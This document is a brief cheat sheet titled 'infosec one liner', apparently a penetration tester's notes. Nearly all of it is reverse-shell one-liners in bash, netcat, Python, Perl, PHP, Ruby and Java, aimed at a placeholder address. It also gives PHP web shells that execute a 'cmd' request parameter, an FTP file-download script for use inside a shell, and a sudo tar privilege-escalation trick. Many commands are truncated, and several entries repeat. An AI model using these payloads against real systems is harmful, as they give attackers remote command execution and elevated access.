# **infosec one liner**

Bash : bash -i >& /dev/tcp/x.x.x.x  
  
Netcat without e flag : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x  
  
Netcat Linux : nc -e /bin/sh x.x.x.x  
  
Netcat windows : nc -e cmd.exe x.x.x.x  
  
Python : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x  
  
Perl: perl -e 'use Socket;$i="x.x.x.x  
  
PHP command Injection:  
<?php echo system($_GET["cmd"]);?>  
  
#Alternative  
<?php echo shell_exec($_GET["cmd"]);?>  
  
  
  
#bash  
bash -i >& /dev/tcp/x.x.x.x  
  
#perl  
perl -e 'use Socket;$i="x.x.x.x  
  
#python  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x  
  
  
#php  
php -r '$sock=fsockopen("x.x.x.x  
  
  
#ruby  
ruby -rsocket -e'f=TCPSocket.open("x.x.x.x  
  
  
netcat with e  
nc -e /bin/sh x.x.x.x  
  
  
without e  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x  
  
  
#java  
r = Runtime.getRuntime()  
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x  
p.waitFor()  
  
  
  
#rev shell  
  
# In reverse shell  
echo open x.x.x.x  
echo USER anonymous >> ftp.txt  
echo ftp >> ftp.txt  
echo bin >> ftp.txt  
echo GET file >> ftp.txt  
echo bye >> ftp.txt  
  
# Execute  
ftp -v -n -s:ftp.txt  
  
  
#tar Exploit  
Tar Exploit - one shell script :  
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/x.x.x.x  
tar -cvf a.tar a.sh  
sudo -u onuma tar -xvf a.tar --to-command /bin/bash